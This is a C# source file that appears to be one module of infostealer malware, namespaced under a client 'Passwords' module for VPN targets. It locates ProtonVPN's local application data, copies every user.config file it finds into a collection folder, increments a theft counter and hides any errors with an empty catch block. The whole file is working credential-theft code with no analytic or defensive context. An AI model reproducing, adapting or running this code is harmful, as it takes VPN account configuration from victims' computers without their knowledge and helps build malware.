using System;
using System.IO;
using Client.Modules.Passwords.Helpers;

namespace Client.Modules.Passwords.Targets.VPN;

internal sealed class ProtonVPN
{
	public static void Save(string sSavePath)
	{
		string path = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), "ProtonVPN");
		if (!Directory.Exists(path))
		{
			return;
		}
		try
		{
			string[] directories = Directory.GetDirectories(path);
			foreach (string text in directories)
			{
				if (!text.Contains("ProtonVPN.exe"))
				{
					continue;
				}
				string[] directories2 = Directory.GetDirectories(text);
				for (int j = 0; j < directories2.Length; j++)
				{
					string text2 = directories2[j] + "\\user.config";
					string text3 = Path.Combine(sSavePath, new DirectoryInfo(Path.GetDirectoryName(text2)).Name);
					if (!Directory.Exists(text3))
					{
						Counter.VPN++;
						Directory.CreateDirectory(text3);
						File.Copy(text2, text3 + "\\user.config");
					}
				}
			}
		}
		catch
		{
		}
	}
}
